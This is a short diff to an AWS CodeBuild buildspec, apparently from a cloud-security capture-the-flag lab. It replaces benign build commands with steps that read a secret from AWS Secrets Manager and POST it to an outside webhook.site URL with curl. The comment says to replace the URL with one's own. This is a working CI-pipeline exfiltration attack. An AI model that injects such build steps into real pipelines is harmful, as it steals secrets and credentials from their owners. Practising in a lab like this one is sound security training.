@@ -3,6 +3,11 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== Starting Flag Extraction ==="
+      # 1. This command asks AWS for the secret value
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      
+      # 2. This command sends that flag to your webhook URL (Replace the URL with yours!)
+      - curl -X POST https://webhook.site/16bd594a-76dc-40fc-94ac-19865b1a7aae --data "flag=$FLAG"
+      
+      - echo "=== Done ==="
